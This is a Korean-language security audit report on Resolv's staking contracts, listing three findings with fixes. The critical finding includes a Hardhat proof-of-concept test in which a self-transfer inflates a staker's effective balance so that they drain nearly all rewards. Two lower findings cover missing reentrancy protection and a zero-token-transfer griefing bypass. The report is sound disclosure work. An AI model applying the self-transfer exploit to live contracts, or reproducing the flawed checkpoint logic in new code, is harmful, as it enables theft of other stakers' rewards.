# 정보

Pashov Audit Group은 업계 최고의 스마트 계약 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 1000개 이상의 보안 취약점을 보고한 경험을 바탕으로, 그룹은 절대적으로 최고의 감사 여정을 제공하기 위해 노력합니다. 100% 보안은 보장할 수 없지만, 숙련된 연구원들이 귀하의 블록체인 프로토콜을 위해 최선을 다할 것임을 보장합니다. [여기](https://github.com/pashov/audits)에서 이전 작업을 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 연락하십시오.

# 면책 조항

스마트 계약 보안 검토는 취약점의 완전한 부재를 절대 확인할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로, 우리는 가능한 한 많은 취약점을 찾기 위해 노력합니다. 우리는 검토 후 100% 보안을 보장할 수 없으며, 검토가 스마트 계약의 문제를 발견할 것이라고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개

**resolv-im/resolv-contracts** 저장소에 대한 시간 제한 보안 검토는 **Pashov Audit Group**에 의해 수행되었으며, **Shaka, btk, shaflow, smbv1923**가 **Resolv** 검토에 참여했습니다. 총 **3**개의 문제가 발견되었습니다.

# Resolv 정보

Resolv Staking은 사용자가 $RESOLV를 스테이킹하고 거버넌스 및 시간 가중 보상 분배(WAHP)에 사용되는 양도 불가능한 stRESOLV 토큰을 받을 수 있도록 합니다. 보상은 소급 변경 없이 업데이트된 스테이크 잔액을 기준으로 앞으로만 계산됩니다. 동시에 RewardDistributor 계약은 $USR 보상을 민팅하고 드립(drip) 모델과 리베이스 로직을 사용하여 stUSR 계약에 점진적으로 분배함으로써 수동 청구 없이 수동적이고 비례적인 수익을 가능하게 합니다.

# 보안 평가 요약

**검토 커밋 해시:**<br>• [f7d7fee7ca456a564fb24b2db5b3f740ef7fa525](https://github.com/resolv-im/resolv-contracts/tree/f7d7fee7ca456a564fb24b2db5b3f740ef7fa525)<br>&nbsp;&nbsp;(resolv-im/resolv-contracts)

**수정 검토 커밋 해시:**<br>• [2f71574f8d57d9ecac9cbf30dc38064394796f60](https://github.com/resolv-im/resolv-contracts/tree/2f71574f8d57d9ecac9cbf30dc38064394796f60)<br>&nbsp;&nbsp;(resolv-im/resolv-contracts)

# 범위

- `ResolvStakingV2.sol`
- `ResolvToken.sol`

# 발견 사항

# [C-01] 자신에게 토큰을 전송하여 보상을 훔칠 수 있음

_해결됨_

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

`ResolvStakingV2` 토큰이 전송될 때 발신자와 수신자의 체크포인트가 그에 따라 업데이트됩니다.

사용자가 자신에게 토큰을 전송하면 첫 번째 체크포인트는 사용자에 대해 음수 델타로 업데이트되고, 두 번째 체크포인트는 동일한 사용자에 대해 양수 델타로 업데이트됩니다.

그러나 첫 번째 체크포인트가 업데이트된 후 사용자의 잔액이 업데이트되지 않았으므로 두 번째 체크포인트에 대해 `ResolvStakingCheckpoints.updateEffectiveBalance()`가 호출될 때 `userStakedBalance` 매개변수가 사용자의 잔액을 과대평가하여 사용자의 `effectiveBalance`가 실제보다 더 커지게 됩니다.

```solidity
    function _update(
        address _from,
        address _to,
        uint256 _value
    ) internal override(ERC20VotesUpgradeable, ERC20Upgradeable) {
        if (_from != address(0) && _to != address(0)) {
            checkpoint(_from, false, address(0), - SafeCast.toInt256(_value));
@>          checkpoint(_to, false, address(0), SafeCast.toInt256(_value));

(...)

    function checkpoint(
        address _user,
        bool _claim,
        address _rewardReceiver,
        int256 _delta
    ) internal {
(...)
        totalEffectiveSupply = usersData.updateEffectiveBalance(
            ResolvStakingCheckpoints.UpdateEffectiveBalanceParams({
                user: _user,
                userStakedBalance: balanceOf(_user),
@>              userStakedBalance: balanceOf(_user),
```

결과적으로 사용자는 자신에게 토큰을 전송하여 유효 잔액을 부풀릴 수 있으며, 이를 통해 원래 받아야 할 것보다 더 많은 보상을 청구할 수 있게 되어 다른 사용자가 더 적은 보상을 받게 됩니다. 실제로 이를 통해 누군가가 계약에서 사용 가능한 모든 보상을 훔칠 수 있습니다.

### 개념 증명 (Proof of concept)

`ResolvStakingV2.ts` 파일에 다음 코드를 추가하고 `yarn hardhat test`를 실행하십시오.

```ts
it.only("Transfer to oneself increases effective balance", async () => {
	const {
		resolvToken,
		resolvStaking,
		REWARD_18,
		staker,
		staker1,
		resolvInitialSupplyHolder
	} = await loadFixture(deployTokenFixture);
	await resolvStaking.setTransferEnabled(true);
	await resolvStaking.setClaimEnabled(true);

	// Two stakers deposit the same amount (100 RESOLV)
	await resolvToken.connect(staker).approve(resolvStaking, ethers.MaxUint256);
	await resolvToken.connect(staker1).approve(resolvStaking, ethers.MaxUint256);
	await resolvToken.connect(resolvInitialSupplyHolder).transfer(staker, parseRESOLV(100));
	await resolvStaking.connect(staker).deposit(parseRESOLV(100), staker);
	await resolvToken.connect(resolvInitialSupplyHolder).transfer(staker1, parseRESOLV(100));
	await resolvStaking.connect(staker1).deposit(parseRESOLV(100), staker1);

	// Distributor deposits 140 reward tokens
	await resolvStaking.addRewardToken(REWARD_18);
	await REWARD_18.approve(resolvStaking.getAddress(), ethers.MaxUint256);
	await resolvStaking.depositReward(REWARD_18, parseREWARD18(140), 0);

	// Staker transfers 100 stRESOLV to himself
	await resolvStaking.connect(staker).transfer(staker, parseRESOLV(100));

	// Staker effective balance is equal to total effective supply
	const stakerEffectiveBalance = (await resolvStaking.usersData(staker.address)).effectiveBalance;
	const totalEffectiveSupply = await resolvStaking.totalEffectiveSupply();
	expect(stakerEffectiveBalance).to.equal(totalEffectiveSupply);
	
	// Rewards are accumulated for 14 days
	await time.increase(DAYS_14);

	// Checkpoints are updated
	await resolvStaking.connect(staker).updateCheckpoint(staker);
	await resolvStaking.connect(staker1).updateCheckpoint(staker1);

	// Staker claimable rewards are approx double the amount of staker1
	const stakerClaimable = await resolvStaking.getUserClaimableAmounts(staker, REWARD_18);
	const staker1Claimable = await resolvStaking.getUserClaimableAmounts(staker1, REWARD_18);
	expect(stakerClaimable).to.closeTo(parseREWARD18(140), 10n ** 14n); // 0.0001e18 tolerance
	expect(staker1Claimable).to.closeTo(parseREWARD18(70), 10n ** 14n); // 0.0001e18 tolerance

	// Both stakers claim rewards
	await resolvStaking.connect(staker).claim(staker, staker);
	await resolvStaking.connect(staker1).claim(staker1, staker1);

	// Staker claims almost all rewards
	// Staker1 claims almost nothing, as there are not enough reward tokens left in the contract
	const stakerBalance = await REWARD_18.balanceOf(staker.address);
	const staker1Balance = await REWARD_18.balanceOf(staker1.address);
	expect(stakerBalance).to.closeTo(parseREWARD18(140), 10n ** 14n); // 0.0001e18 tolerance
	expect(staker1Balance).to.closeTo(parseREWARD18(0), 10n ** 14n); // 0.0001e18 tolerance
})
```

## 권장 사항

```diff
    function _update(
        address _from,
        address _to,
        uint256 _value
    ) internal override(ERC20VotesUpgradeable, ERC20Upgradeable) {
        if (_from != address(0) && _to != address(0)) {
+	    require(_from != _to, ResolvStakingErrors.TransferToSelf());
            checkpoint(_from, false, address(0), - SafeCast.toInt256(_value));
```

# [L-01] `_update` 함수에 `nonReentrant` 수정자 누락

_해결됨_

체크포인트 업데이트와 관련된 모든 함수는 재진입을 방지하기 위해 `nonReentrant` 수정자로 보호됩니다.
그러나 체크포인트를 업데이트하기 위해 `transfer` 및 `transferFrom` 작업 중에 호출되는 `_update` 함수는 `nonReentrant`에 의해 보호되지 않습니다.

```solidity
    function _update(
        address _from,
        address _to,
        uint256 _value
    ) internal override(ERC20VotesUpgradeable, ERC20Upgradeable) {
        if (_from != address(0) && _to != address(0)) {
            checkpoint(_from, false, address(0), - SafeCast.toInt256(_value));
            checkpoint(_to, false, address(0), SafeCast.toInt256(_value));
        }
        super._update(_from, _to, _value);
    }
```

후크나 외부 콜백을 지원하는 특수 보상 토큰의 경우 전송 중에 `checkpoint` 로직으로 재진입 호출을 허용할 수 있습니다. 지금까지 확인된 구체적인 영향은 없지만, 나머지 체크포인트 업데이트 로직과 일치시키고 잠재적인 재진입 위험을 제거하기 위해 `_update`에도 동일한 `nonReentrant` 보호를 적용하는 것이 좋습니다.

# [L-02] 0 토큰 전송으로 체크포인트 업데이트 우회 가능

_인정됨_

`updateCheckpoint()` 및 `claim()` 함수는 사용자 또는 위임된 계정만 호출할 수 있습니다. 이 제한은 이전 감사의 [이 문제](https://github.com/PashovAuditGroup/Resolv_April25_MERGED/issues/11)에 설명된 대로 사용자의 청구 가능한 보상에 영향을 미칠 수 있는 그리핑(griefing) 공격을 방지하기 위해 도입되었습니다.

그러나 전송이 활성화되면 사용자에게 0 토큰을 전송하여 체크포인트 업데이트를 트리거하는 제한을 우회할 수 있으므로 누구나 체크포인트를 업데이트하고 잠재적으로 청구 가능한 보상을 조작하여 사용자를 괴롭힐 수 있습니다.

누구나 사용자를 대신하여 토큰을 예치할 수 있는 `deposit()` 함수에도 동일한 공격 벡터가 존재한다는 점에 유의하는 것도 중요합니다. 하지만 이 경우 각 예치 시 최소 1 wei를 기부해야 하므로 보상 스케일 팩터가 이제 `1e24`로 설정되어 악용 가능성이 낮습니다.

**권장 사항**

이 공격을 방지하는 가장 쉬운 방법은 전송하거나 사용자를 대신하여 예치할 때 최소 토큰 금액을 요구하거나, 대안으로 사용자가 자신에게 토큰을 전송하거나 대신 예치할 수 있는 계정을 화이트리스트에 추가하는 허가된 시스템을 사용하는 것입니다.
